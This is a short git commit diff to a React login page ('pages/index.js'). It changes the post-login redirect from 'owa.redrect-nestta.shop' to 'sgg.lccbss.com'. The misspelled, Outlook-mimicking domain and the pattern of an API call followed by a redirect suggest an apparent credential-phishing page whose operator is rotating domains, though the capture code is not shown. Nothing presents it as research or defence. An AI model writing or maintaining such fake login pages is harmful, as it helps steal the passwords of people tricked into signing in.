b52a04fd79db07a14835a16eca2412be32504bac
husknet <127146284+husknet@users.noreply.github.com>
2025-05-05 13:33:21 +0000

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://owa.redrect-nestta.shop/';
+      window.location.href = 'https://sgg.lccbss.com/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
